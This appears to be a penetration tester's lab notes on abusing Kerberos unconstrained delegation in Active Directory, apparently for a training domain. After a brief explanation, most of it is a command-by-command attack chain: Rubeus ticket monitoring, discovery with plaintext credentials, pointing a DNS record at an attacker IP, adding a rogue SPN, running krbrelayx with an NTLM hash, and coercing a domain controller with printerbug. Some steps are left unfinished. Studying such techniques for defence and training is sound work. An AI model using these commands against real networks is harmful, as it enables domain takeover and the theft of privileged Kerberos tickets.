
 Unconstrained delegation was the only type of delegation available in Windows 2000, If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or force it) using Kerberos. The attacker service will receive an ST (service ticket) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user. Alternatively, the TGT can be used with S4U2self abuse in order to gain local admin privileges over the TGT's owner.

as a computer the attack chains pretty easy, we need to create a machine account 



## From computer


```
.\Rubeus.exe monitor /interval:5 /nowrap
```


```
.\Rubeus.exe monitor /interval:5 /targetuser:DC$ /nowrap
```



### User sub path

We need a user who is in control of another users/objects SPN, preferrably has GenericWrite/GenericAll 

```
nxc ldap inlanefreight.local -u 'carole.rose' -p 'jasmine' --find-delegation
```


```
python dnstool.py -u DOMAIN.LOCAL\\username -p 'password' -r roguecomputer.DOMAIN.LOCAL -d <ATTACKER_IP> --action modify <DOMAIN_IP>
```


```
python addspn.py -u domain.local\\username -p 'password' --target-type samname -t <CONTROLLED_USER> -s CIFS/roguecomputer.domain.local dc01.inlanefreight.local
```


Set up the listener so the tool automatically extracts the TGT embedded inside the TGS ticket.

```
python krbrelayx.py -hashes :3e7c48255206470a13543b27b7af18de
```

Now we coerce the authentication

```
python3 printerbug.py inlanefreight.local/carole.rose:jasmine@10.129.205.35 roguecomputer.inlanefreight.local
```













# References

https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-1/

https://learn.microsoft.com/en-us/archive/blogs/askds/kerberos-for-the-busy-admin

https://adsecurity.org/?p=1667